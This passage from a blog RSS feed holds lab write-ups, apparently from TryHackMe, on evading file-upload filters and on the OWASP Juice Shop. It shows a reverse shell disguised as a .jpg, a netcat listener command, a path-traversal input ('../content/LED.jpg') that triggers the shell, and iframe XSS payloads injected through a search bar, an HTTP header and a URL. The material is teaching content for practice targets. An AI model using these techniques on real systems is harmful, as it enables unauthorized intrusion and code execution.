<p>However, we note that navigating to the <code>/admin</code> page itself gives us access to a &ldquo;Top Secret!&rdquo; webform with which to activate modules from the <code>/modules</code> server directory, meaning that we can execute specific files.</p>
<p><img src="/images/uv/jewel-admin-page.png" alt="jewel-admin-page"></p>
<p>Next, we can try a more targeted <code>gobuster</code> scan in the server&rsquo;s <code>/content</code> directory, to try to find our uploaded <code>.jpg</code> file, using the downloadable wordlist presented to us by the THM task.</p>
<p><img src="/images/uv/jewel-gb-jpg.png" alt="jewel-gb-jpg"></p>
<p>In addition to <code>ABH.jpg</code>, <code>LKQ.jpg</code>, <code>SAD.jpg</code>, and <code>UAD.jpg</code>, which make up the slideshow images on the home page, we see <code>RNG.jpg</code>. To confirm that this is ours, we can visit <code>http://jewel.uploadvulns.thm/content/RNG.jpg</code> in our browser and ensure that our uploaded image file is visible.</p>
<p><img src="/images/uv/jewel-uploaded.png" alt="jewel-uploaded"></p>
<h3 id="bypassing-filters">Bypassing filters</h3>
<p>Now that we have identified the destination of uploaded <code>/jpg</code> images to the server,
we need to figure out how to get our <code>njs-shell.js</code> reverse shell past the upload filters, both client-side and server-side.</p>
<p>Let us begin by renaming our <code>njs-shell.js</code> script to <code>njs-shell.jpg</code> to conform with the identified file extension for bypassing any (server-side) MIME filters that may exist. If we find that the server is incapable of executing our script with a <code>.jpg</code> ending, we can revisit.</p>
<p>Our next step to successfully uploading our reverse shell will be to defeat this, which runs on our (client) browser when we load the <code>http://jewel.uploadvulns.thm</code> home page.</p>
<p>We can do this in <code>BurpSuite</code> by removing the prohibitive code from  <code>upload.js</code> before the served content is rendered in our browser. To do so, we enable <code>interception</code> and refresh the page. Forward along each request until you reach the one related to <code>upload.js</code>, then right click the request space and choose <code>do intercept</code> then <code>response to this request</code>.</p>
<p><strong>Note:</strong> If you have a cached version of <code>upload.js</code> and other site assets, you will not be able to edit the script, as the server will send a message confirming the validity of your cached script instead of its contents.</p>
<p><img src="/images/uv/jewel-jsfilter.png" alt="jewel-jsfilter"></p>
<p>After removing the necessary code, which we initially uncovered during the Identifying Vulnerabilities phase, we forward the new script to our browser. We can then successfully upload our <code>njs-shell.jpg</code> file to the server.</p>
<p>In order to confirm our success, we can run another <code>gobuster</code> scan, which confirms the existence of <code>LED.jpg</code> in the <code>/content</code> directory.</p>
<p><img src="/images/uv/jewel-jsjpg-upload.png" alt="jewel-jsjpg-upload"></p>
<p>To activate our reverse shell and achieve RCE, we&rsquo;ll need to remember to enable our <code>netcat</code> listener with:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span>
</span></span></code></pre></div><p>Now we can navigate to the secret admin page that we identified at <code>http://jewel.uploadvulns.thm/admin</code> and determine how to activate our reverse shell via <code>http://jewel.uploadvulns.thm/content/LED.jpg</code>. The placeholder text of the form field tells us that we can input the location of files to execute from the <code>/modules</code> directory. From our previous More Enumeration efforts, we know that the <code>/content</code> directory sits adjacent to <code>/modules</code> under the root level of the server&rsquo;s filesystem. Thus, unless actively prohibited, we can use <code>../</code> to traverse directories. This means that by entering <code>../content/LED.jpg</code>, we should be able to activate our reverse shell script.</p>
<p><img src="/images/uv/jewel-led-rce.png" alt="jewel-led-rce"></p>
<p><em>et voilà!</em></p>
<p>Thanks to <a href="https://tryhackme.com/p/MuirlandOracle">MuirlandOracle</a> for the informative room!</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>i.e., without access to, or knowledge of, the source code.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content>
        </item>
        
        <item>
            <title>Finishing the OWASP Juice Shop</title>
            <link>https://robscharf.github.io/posts/2022/04/finishing-the-owasp-juice-shop/</link>
            <pubDate>Mon, 25 Apr 2022 14:20:00 +0000</pubDate>
            
            <guid>https://robscharf.github.io/posts/2022/04/finishing-the-owasp-juice-shop/</guid>
            <description>Wrapping up my intro to the Juice Shop Today I finished up the OWASP Juice Shop Room on THM, after leaving the final Cross-site Scripting (XSS) modules unfinished last week. This involved quick introductory examples of three XSS modalities:
DOM Persistent (Server-side) Reflected (Client-side) DOM XSS uses the HTML environment to execute malicious JavaScript. This type of attack commonly uses the &amp;lt;script&amp;gt; HTML tag. Persistent XSS is JavaScript that is run when the server loads the page containing it.</description>
            <content type="html"><![CDATA[<h3 id="wrapping-up-my-intro-to-the-juice-shop">Wrapping up my intro to the Juice Shop</h3>
<p>Today I finished up the <a href="https://tryhackme.com/room/owaspjuiceshop">OWASP Juice Shop Room</a> on THM, after leaving the final Cross-site Scripting (XSS) modules unfinished last week. This involved quick introductory examples of three XSS modalities:</p>
<table>
<thead>
<tr>
<th>DOM</th>
<th>Persistent (Server-side)</th>
<th>Reflected (Client-side)</th>
</tr>
</thead>
<tbody>
<tr>
<td>DOM XSS uses the HTML environment to execute malicious JavaScript. This type of attack commonly uses the <code>&lt;script&gt;</code> HTML tag.</td>
<td>Persistent XSS is JavaScript that is run when the server loads the page containing it. These can occur when the server does not sanitise the user data when it is uploaded to a page. These are commonly found on blog posts.</td>
<td>Reflected XSS is JavaScript that is run on the client-side end of the web application. These are most commonly found when the server doesn&rsquo;t sanitise search data.</td>
</tr>
</tbody>
</table>
<p>The first example, <strong>Document Object Model-based Cross-site Scripting</strong>, involved entering
<code>&lt;iframe src=&quot;javascript:alert('xss')&quot;&gt;</code> into the Juice Shop&rsquo;s search bar, which uses JavaScript to generate new DOM elements. This causes the server to create an iframe, as a new entity in the site&rsquo;s structure (in this case, containing a modal pop-up containing the &lsquo;xss&rsquo; text entered as an argument). More specifically, this technique is known as &ldquo;cross-frame scripting.&rdquo;</p>
<p>The second example, a <strong>persistent</strong> cross-site scripting attack, centers on the interception and manipulation of the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers">HTTP headers</a>. We use <a href="https://portswigger.net/burp">Burp Suite</a> to intercept the site&rsquo;s attempt to capture our computer&rsquo;s ip address while logging out. Instead of providing the server with an updated <code>True-Client-IP</code> value, we give the server our favorite xss text iframe: <code>&lt;iframe src=&quot;javascript:alert('xss')&quot;&gt;</code>. This attack persists, as it exists as a stored/called value on the server side, and relies on a lack on input sanitization.</p>
<p>Finally, we execute a <strong>reflected</strong> XSS attack, which is executed on the client-side, unlike the previous example. This involves using knowledge about the site&rsquo;s structure and server processes to exploit unsanitized search data. Here, we find that the Juice Shop&rsquo;s Orders &amp; Payment page provides the user with links to track thier purchases in the following format:
<code>https://juice-sh.op/#/track-result?id=5267-53bf6f08cfb76ee6</code></p>
<p>If we replace the <code>track-result-id</code> with our favorite iframe JavaScript code, the server will create our JavaScriptified iFrame. This is due to the server not sanitizing tracking information id numbers, as it returns the information from a database.</p>
]]></content>
        </item>
        
        <item>
            <title>On GitHub Pages</title>
            <link>https://robscharf.github.io/posts/2022/04/on-github-pages/</link>
            <pubDate>Mon, 11 Apr 2022 00:00:00 +0000</pubDate>
            
            <guid>https://robscharf.github.io/posts/2022/04/on-github-pages/</guid>
            <description>Welcome to my new GitHub blog It&amp;rsquo;s powered by Hugo and is based on the excellent hello-friend-ng theme by Djordje Atlialp.</description>
            <content type="html"><![CDATA[<h2 id="welcome-to-my-new-github-blog">Welcome to my new GitHub blog</h2>
<p>It&rsquo;s powered by <a href="https://github.com/spf13/hugo/releases">Hugo</a> and is based on the excellent <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng#how-to-start">hello-friend-ng theme</a> by <a href="https://github.com/rhazdon">Djordje Atlialp</a>.</p>
]]></content>
        </item>
        
    </channel>
</rss>
